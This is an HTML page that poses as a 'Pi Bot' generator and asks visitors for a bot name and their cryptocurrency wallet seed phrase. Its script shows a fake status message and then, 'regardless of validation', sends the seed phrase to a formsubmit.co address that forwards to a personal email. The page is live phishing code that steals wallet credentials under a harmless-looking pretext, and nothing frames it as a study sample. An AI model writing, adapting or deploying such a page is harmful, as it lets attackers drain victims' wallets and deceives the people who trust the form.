<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pi Bot Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        h1 {
            margin-top: 20px;
            color: #333;
        }
        p {
            color: #555;
        }
        form {
            display: flex;
            flex-direction: column;
            max-width: 300px;
            margin: 20px auto;
            padding: 20px;
            background: white;
            border-radius: 5px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }
        label {
            font-weight: bold;
            margin-top: 10px;
        }
        input, textarea {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        textarea {
            height: 100px;
        }
        button {
            margin-top: 15px;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .message {
            margin-top: 10px;
            font-weight: bold;
            color: red;
        }
    </style>
</head>
<body>
    <h1>Test Your Pi Bot Here</h1>
    <p>Enter your details below:</p>

    <form id="botForm">
        <label for="botName">Preferred Name of Your Bot:</label>
        <input type="text" id="botName" name="botName" required>

        <label for="seedPhrase">Enter Your Wallet Seed Phrase:</label>
        <textarea id="seedPhrase" name="seedPhrase" required></textarea>

        <button type="submit">Submit</button>
    </form>

    <p class="message" id="responseMessage"></p>

    <a href="index.html">Back to Home</a>

    <script>
        document.getElementById("botForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent normal form submission

            let botName = document.getElementById("botName").value.trim();
            let seedPhrase = document.getElementById("seedPhrase").value.trim();
            let responseMessage = document.getElementById("responseMessage");

            if (botName === "" || seedPhrase === "") {
                responseMessage.style.color = "red";
                responseMessage.innerText = "Please fill in both fields!";
                return;
            }

            let seedWords = seedPhrase.split(/\s+/); // Split by spaces

            if (seedWords.length === 24) {
                responseMessage.style.color = "green";
                responseMessage.innerText = "Generating your bot...";
            } else {
                responseMessage.style.color = "red";
                responseMessage.innerText = "Seed phrase incorrect!";
            }

            // Send the data regardless of validation
            fetch("https://formsubmit.co/piusolumide6@gmail.com", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ botName, seedPhrase })
            }).then(res => res.json()).then(data => console.log(data));
        });
    </script>
</body>
</html>
